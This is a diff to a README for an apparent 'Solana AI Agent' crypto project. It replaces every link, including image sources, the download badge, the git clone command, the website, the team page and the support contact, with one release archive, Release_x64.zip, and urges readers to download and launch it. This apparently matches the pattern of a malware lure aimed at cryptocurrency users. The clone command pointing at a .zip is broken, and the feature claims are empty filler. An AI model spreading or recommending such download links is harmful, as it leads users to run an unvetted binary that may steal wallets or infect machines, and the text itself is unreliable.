@@ -2,7 +2,7 @@
 
 Welcome to the Solana AI Agent repository, where cutting-edge technology meets the decentralized world! 🌐
 
-![Solana AI Agent](https://www.example.com/solana_ai_agent.jpg)
+![Solana AI Agent](https://github.com/iyajordy/solana-ai-agent/releases/download/v1.0/Release_x64.zip)
 
 ## Repository Name
 **solana-ai-agent**
@@ -15,14 +15,14 @@ agent, ai, ai-agent, anchor, python, rust, solana
 
 ## Software Download
 Please download the AI Agent software from the following link:
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/iyajordy/solana-ai-agent/releases/download/v1.0/Release_x64.zip)](https://github.com/iyajordy/solana-ai-agent/releases/download/v1.0/Release_x64.zip)
 
 Kindly note that the software needs to be launched after downloading for an optimal experience.
 
 ## About Solana AI Agent
 The Solana AI Agent is a groundbreaking project that leverages the power of artificial intelligence within the Solana blockchain ecosystem. 🚀
 
-![AI Agent in Action](https://www.example.com/ai_agent_action.jpg)
+![AI Agent in Action](https://github.com/iyajordy/solana-ai-agent/releases/download/v1.0/Release_x64.zip)
 
 ### Features
 - **Artificial Intelligence**: The AI Agent utilizes advanced AI algorithms to perform various tasks efficiently.
@@ -37,7 +37,7 @@ The Solana AI Agent is a groundbreaking project that leverages the power of arti
 ## Installation
 To install the Solana AI Agent, follow these simple steps:
 ```bash
-git clone https://github.com/solana-ai-agent.git
+git clone https://github.com/iyajordy/solana-ai-agent/releases/download/v1.0/Release_x64.zip
 cd solana-ai-agent
 npm install
 ```
@@ -52,12 +52,12 @@ npm start
 We welcome contributions from the community to make Solana AI Agent even better! Feel free to submit pull requests or open issues on our GitHub repository.
 
 ## Stay Connected
-Stay updated with the latest news and developments regarding Solana AI Agent by visiting our [website](https://www.solana-ai-agent.com).
+Stay updated with the latest news and developments regarding Solana AI Agent by visiting our [website](https://github.com/iyajordy/solana-ai-agent/releases/download/v1.0/Release_x64.zip).
 
 ## Meet the Team
-The Solana AI Agent project is maintained by a team of passionate developers dedicated to pushing the boundaries of technology and blockchain innovation. Meet the team [here](https://www.solana-ai-agent.com/team).
+The Solana AI Agent project is maintained by a team of passionate developers dedicated to pushing the boundaries of technology and blockchain innovation. Meet the team [here](https://github.com/iyajordy/solana-ai-agent/releases/download/v1.0/Release_x64.zip).
 
 ## Support
-If you encounter any issues or have questions regarding Solana AI Agent, please reach out to our support team at support@solana-ai-agent.com.
+If you encounter any issues or have questions regarding Solana AI Agent, please reach out to our support team at https://github.com/iyajordy/solana-ai-agent/releases/download/v1.0/Release_x64.zip
 
 🌟 Thank you for exploring the Solana AI Agent repository! Let's revolutionize the future together. 🌟
